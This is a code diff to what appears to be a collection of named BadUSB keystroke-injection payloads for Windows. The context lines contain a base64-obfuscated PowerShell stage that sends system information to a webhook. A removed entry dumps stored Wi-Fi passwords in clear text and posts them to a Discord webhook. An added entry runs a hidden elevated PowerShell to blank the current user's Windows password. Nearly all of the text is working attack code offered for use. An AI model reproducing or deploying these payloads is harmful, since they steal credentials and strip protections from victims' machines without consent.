@@ -565,28 +565,59 @@ REM Replace the base64 string by the powershell encoded script.
 STRING $TempFile = "$env:TEMP\\temp.ps1"; $File = "$env:TEMP\\k.ps1"; echo JG91dHB1dCA9IHN5c3RlbWluZm8KJGI2NG91dHB1dCA9IFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkb3V0cHV0KSkKJG1heFNlZ21lbnRMZW5ndGggPSAxODAwCiRzZWdtZW50cyA9IFtTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W3N0cmluZ11dQCgpCmZvciAoJGkgPSAwOyAkaSAtbHQgJGI2NG91dHB1dC5MZW5ndGg7ICRpICs9ICRtYXhTZWdtZW50TGVuZ3RoKSB7CiAgICAkc2VnbWVudCA9ICRiNjRvdXRwdXQuU3Vic3RyaW5nKCRpLCBbTWF0aF06Ok1pbigkbWF4U2VnbWVudExlbmd0aCwgJGI2NG91dHB1dC5MZW5ndGggLSAkaSkpCiAgICAkc2VnbWVudHMuQWRkKCRzZWdtZW50KQp9CmZvcmVhY2ggKCRzZWdtZW50IGluICRzZWdtZW50cykgewogICAgJGJvZHkgPSBAewogICAgICAgIGNvbnRlbnQgPSAkc2VnbWVudAogICAgfSB8IENvbnZlcnRUby1Kc29uCkludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHdlYmhvb2sgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKfQ== > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\\k.ps1"
 DELAY 1000
 ENTER`
-            },
+},
             {
-                name: "ZRK Wifi Passwords to Discord",
-                category: "Network Exploitation",
-                description: "Retrieves Wi-Fi stored passwords and sends them to a Discord webhook.",
-                code: `REM Title: Wifi stored passwords to Discord Webhook
-REM Description: Retrieves the Wifi stored passwords from the computer and sends it as JSON content in a POST request to a Discord webhook.
-REM AUTHOR: K1kuK0nK4
+                name: "ZRK Disable Windows Password",
+                category: "System Exploitation",
+                description: "Disables the Windows password for the current user.",
+                code: `REM Title: Disable Windows Password
+REM Description: This script disables the Windows password for the current user.
 REM Target: Windows
 
-DELAY 1500
+DELAY 2500
+REM Minimize all apps
+GUI d
+DELAY 500
+REM Start PowerShell as admin
 GUI r
 DELAY 500
-STRING powershell
+STRING powershell.exe -windowstyle hidden
+DELAY 200
+CTRL SHIFT ENTER
+DELAY 2000
+LEFT
+DELAY 150
 ENTER
 DELAY 2000
-REM Replace "webhookgoeshere" by webhook URL.
-STRING $webhook = "webhookgoeshere";
-REM Replace the base64 string by the powershell encoded script.
-STRING $TempFile = "$env:TEMP\\temp.ps1"; $File = "$env:TEMP\\k.ps1"; echo JHdpZmkgPSBuZXRzaCB3bGFuIHNob3cgcHJvZmlsZXMKJGNyZWRzID0gQCgpCiR3aWZpIHwgJSB7CiAgICBpZiAoJF8gLW1hdGNoICJQZXJmaWwgZGUgdG9kb3MgbG9zIHVzdWFyaW9zXHMrOlxzKyguKil8QWxsIFVzZXIgUHJvZmlsZVxzKzpccysoLiopIikgewogICAgICAgICRuZXROID0gaWYgKCRtYXRjaGVzWzFdKSB7ICRtYXRjaGVzWzFdLlRyaW0oKSB9IGVsc2UgeyAkbWF0Y2hlc1syXS5UcmltKCkgfQogICAgICAgICRwcm9mSW5mbyA9IG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlIG5hbWU9IiRuZXROIiBrZXk9Y2xlYXIKICAgICAgICAka2V5Q29udCA9IGlmICgkcHJvZkluZm8gfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJDb250ZW5pZG8gZGUgbGEgY2xhdmV8S2V5IENvbnRlbnQiKSB7CiAgICAgICAgICAgICgkcHJvZkluZm8gfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJDb250ZW5pZG8gZGUgbGEgY2xhdmV8S2V5IENvbnRlbnQiKS5MaW5lIC1yZXBsYWNlICJeXHMqKENvbnRlbmlkbyBkZSBsYSBjbGF2ZXxLZXkgQ29udGVudClccyo6XHMqIiwgIiIKICAgICAgICB9IGVsc2UgeyAiTm8gc2UgcHVkbyByZWN1cGVyYXIgbGEgY2xhdmUiIH0KICAgICAgICAkY3JlZHMgKz0gIiRuZXROOjoka2V5Q29udCIKICAgIH0KfQokYjY0Y3JlZHMgPSBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGNyZWRzIC1qb2luICJgbiIpKQokY2h1bmtzID0gW1N5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXV06Om5ldygpCndoaWxlICgkYjY0Y3JlZHMuTGVuZ3RoIC1ndCAwKSB7CiAgICAkY2h1bmsgPSBpZiAoJGI2NGNyZWRzLkxlbmd0aCAtZ3QgMTgwMCkgeyAkYjY0Y3JlZHMuU3Vic3RyaW5nKDAsIDE4MDApIH0gZWxzZSB7ICRiNjRjcmVkcyB9CiAgICAkY2h1bmtzLkFkZCgkY2h1bmspCiAgICAkYjY0Y3JlZHMgPSAkYjY0Y3JlZHMuU3Vic3RyaW5nKCRjaHVuay5MZW5ndGgpCn0KJGNodW5rcyB8ICUgewogICAgJGJvZHkgPSBAeyBjb250ZW50ID0gJF8gfSB8IENvbnZlcnRUby1Kc29uCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR3ZWJob29rIC1NZXRob2QgUG9zdCAtQm9keSAkYm9keSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iCn0= > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\\k.ps1"
-DELAY 1000
-ENTER`
+REM Disable Windows password
+STRING net user $env:USERNAME *
+ENTER
+DELAY 150
+ENTER
+DELAY 150
+ENTER
+DELAY 200
+REM Exit from PowerShell
+STRING exit
+ENTER
+REM Make Caps Lock flash to indicate completion
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 2000
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+DELAY 150
+CAPSLOCK
+REM End of payload`
+        
             },
             {
                 name: "ZRK JumpScare 2.0",
